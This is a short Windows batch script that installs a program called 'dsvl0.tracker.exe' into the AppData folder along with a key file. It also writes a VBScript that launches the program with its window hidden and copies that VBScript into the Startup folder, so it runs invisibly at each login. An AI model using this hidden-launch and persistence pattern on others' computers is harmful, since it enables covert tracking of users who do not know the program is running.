@echo off
chcp 1251 > nul
set SRC=dsvl0.tracker.exe
set DST=%APPDATA%\dsvl0

if not exist "%DST%" mkdir "%DST%"
if not exist secret.key (
	msg %username% "Pleace put \"secret.key\" in folder"
	exit
)

copy "%SRC%" "%DST%\%SRC%" /Y > nul

set VBS=%DST%\run_silent.vbs
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run Chr(34^) ^& "%DST%\%SRC%" ^& Chr(34^), 0
) > "%VBS%"

set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy secret.key "%DST%\secret.key" /Y > nul
copy "%VBS%" "%STARTUP%\run_silent.vbs" /Y > nul

echo Installed: %SRC%
pause
